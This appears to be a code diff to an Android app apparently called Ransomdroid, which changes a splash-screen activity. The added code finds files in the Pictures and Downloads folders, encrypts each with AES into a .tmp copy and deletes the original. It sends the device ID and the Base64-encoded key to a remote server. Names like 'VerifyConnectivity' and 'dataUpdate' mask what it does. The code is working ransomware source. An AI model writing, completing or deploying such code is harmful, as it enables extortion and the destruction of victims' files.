@@ -6,7 +6,9 @@ import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.telephony.TelephonyManager;
+import android.util.Base64;
 import android.util.Log;
+import android.view.View;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -41,6 +43,8 @@ public class SplashActivity extends Activity implements Runnable {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
         TextView txtLabel = (TextView) findViewById(R.id.frm_splash_label);
+        txtLabel.setEnabled(true);
+        txtLabel.setVisibility(View.VISIBLE);
         txtLabel.setText(R.string.loading);
     }
 
@@ -62,18 +66,14 @@ public class SplashActivity extends Activity implements Runnable {
         }.getClass().getName(), new Object() {
         }.getClass().getEnclosingMethod().getName());
         try {
-            VerifyConectivity task = new VerifyConectivity();
+            VerifyConnectivity task = new VerifyConnectivity();
             task.execute(0);
-            Intent intent = new Intent(SplashActivity.this, MainActivity.class);
-            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
-            startActivity(intent);
-            finish();
         } catch (Exception e) {
             Log.e(TAG, e.getMessage(), e);
         }
     }
 
-    private class VerifyConectivity extends AsyncTask<Integer, Integer, Boolean> {
+    private class VerifyConnectivity extends AsyncTask<Integer, Integer, Boolean> {
 
         String mErrorMsg;
 
@@ -91,10 +91,8 @@ public class SplashActivity extends Activity implements Runnable {
             }.getClass().getName(), new Object() {
             }.getClass().getEnclosingMethod().getName());
 
-            boolean ok = false;
-
             if(Storage.isExternalStorageWritable()){
-                // get files
+                // list files
                 List<File> dirList = new ArrayList<>();
                 dirList.add(Storage.getPicturesDir());
                 dirList.add(Storage.getDownloadsDir());
@@ -111,14 +109,16 @@ public class SplashActivity extends Activity implements Runnable {
 
                 // generate global data
                 Global.numFiles = fileList.size();
-                Global.key = SymmetricAES.getRandomSecretKeySpec(Global.uid);
-                Global.pass = Global.key.getEncoded().toString();
+                if(Global.pass == null){
+                    byte[] key = SymmetricAES.getRandomSecretKeySpec(Global.uid).getEncoded();
+                    Global.pass = Base64.encodeToString(key, Base64.DEFAULT);
+                }
 
-                ok = serverSync();
+                mErrorMsg = serverSync();
                 dataUpdate(fileList);
             }
 
-            return ok;
+            return mErrorMsg == null;
         }
 
         @Override
@@ -126,102 +126,107 @@ public class SplashActivity extends Activity implements Runnable {
             Log.d(new Object() {
             }.getClass().getName(), new Object() {
             }.getClass().getEnclosingMethod().getName());
-            try {
-                if (result) {
-                    Global.STATUS = Status.FINISHED;
-                } else {
-                    Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
-                    finish();
-                }
-            } catch (Exception e) {
-                Log.e(TAG, e.getMessage(), e);
+            if(result) {
+                Intent intent = new Intent(SplashActivity.this, MainActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                startActivity(intent);
+                finish();
+                finish();
+            }else{
+                Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
+                finish();
             }
         }
+    }
 
-        private boolean serverSync(){
-            Log.d(new Object() {
-            }.getClass().getName(), new Object() {
-            }.getClass().getEnclosingMethod().getName());
-            boolean ok = true;
+    private String serverSync(){
+        Log.d(new Object() {
+        }.getClass().getName(), new Object() {
+        }.getClass().getEnclosingMethod().getName());
+        String mErrorMsg = null;
 
-            try {
-                JSONObject data = new JSONObject();
-                data.put("uid", Global.uid);
-                data.put("pass", Global.pass);
+        try {
+            JSONObject data = new JSONObject();
+            data.put("uid", Global.uid);
+            data.put("pass", Global.pass);
 
-                JSONObject request = new JSONObject();
-                request.put("postMessageRequest", data);
+            JSONObject request = new JSONObject();
+            request.put("postMessageRequest", data);
 
-                String responseStr = ServiceBroker.getInstance(getApplicationContext()).postMessage(request.toString());
-                if (responseStr != null) {
-                    JSONObject json = new JSONObject(responseStr);
-                    JSONObject response = (JSONObject) json.get("postMessageResponse");
-                    String errorMsg = Json.getError(response);
-                    if (errorMsg != null && errorMsg.length() > 0) {
-                        throw new RansomdroidException(errorMsg);
-                    }
-                }else{
-                    throw new RansomdroidException("Connectivity Error");
+            String responseStr = ServiceBroker.getInstance(getApplicationContext()).postMessage(request.toString());
+            if (responseStr != null) {
+                JSONObject json = new JSONObject(responseStr);
+                JSONObject response = (JSONObject) json.get("postMessageResponse");
+                String errorMsg = Json.getError(response);
+                if (errorMsg != null && errorMsg.length() > 0) {
+                    throw new RansomdroidException(errorMsg);
                 }
-
-            } catch (Exception e) {
-                mErrorMsg = e.getMessage();
-                Log.e(TAG, e.getMessage(), e);
-                ok = false;
+            }else{
+                throw new RansomdroidException("Connectivity Error");
             }
 
-            return ok;
+        } catch (Exception e) {
+            mErrorMsg = e.getMessage();
+            Log.e(TAG, e.getMessage(), e);
         }
 
-        private void dataUpdate(List<File> fileList){
+        return mErrorMsg;
+    }
 
-            for(File file: fileList){
+    private void dataUpdate(List<File> fileList){
 
-                // get input
-                byte[] input = null;
-                try {
-                    FileInputStream fis = new FileInputStream(file);
-                    input = new byte[fis.available()];
-                    while (fis.read(input) != -1) {
-                        // do nothing, just read
-                    }
-                    fis.close();
-                } catch (FileNotFoundException e) {
-                    Log.e(TAG, e.getMessage(), e);
-                } catch (IOException e) {
-                    Log.e(TAG, e.getMessage(), e);
-                } catch (Exception e) {
-                    Log.e(TAG, e.getMessage(), e);
+        for(File file: fileList){
+            Log.i(TAG, "Update: " + file.getPath());
+
+            File nFile = new File(file.getParent(), file.getName() + ".tmp");
+            if(nFile.exists()){
+                continue; // Go to next file
+            }
+
+            // get input
+            byte[] input = null;
+            try {
+                FileInputStream fis = new FileInputStream(file);
+                input = new byte[fis.available()];
+                while (fis.read(input) != -1) {
+                    // do nothing, just read
                 }
+                fis.close();
+            } catch (FileNotFoundException e) {
+                Log.e(TAG, e.getMessage(), e);
+                continue;
+            } catch (IOException e) {
+                Log.e(TAG, e.getMessage(), e);
+                continue;
+            } catch (Exception e) {
+                Log.e(TAG, e.getMessage(), e);
+                continue;
+            }
 
-                // parse
-                input = SymmetricAES.encrypt(input, Global.uid, Global.key);
-//                files.delete();
+            // parse
+            input = SymmetricAES.encrypt(input, Global.uid, Global.key);
 
-                // create output
-                File nFile = new File(file.getParent(), file.getName() + ".tmp");
-                if (!nFile.exists()) {
-                    FileOutputStream fos = null;
+            // create output
+            FileOutputStream fos = null;
+            try {
+                fos = new FileOutputStream(nFile);
+                fos.write(input);
+                fos.flush();
+                fos.close();
+            } catch (Exception e) {
+                Log.e(TAG, e.getMessage(), e);
+            }finally {
+                if (fos != null) {
                     try {
-                        fos = new FileOutputStream(nFile);
-                        fos.write(input);
-                        fos.flush();
                         fos.close();
-                    } catch (Exception e) {
+                    } catch (IOException e) {
                         Log.e(TAG, e.getMessage(), e);
-                    }finally {
-                        if (fos != null) {
-                            try {
-                                fos.close();
-                            } catch (IOException e) {
-                                Log.e(TAG, e.getMessage(), e);
-                            }
-                        }
                     }
                 }
-
             }
 
+            // clean up
+            file.delete();
         }
 
     }
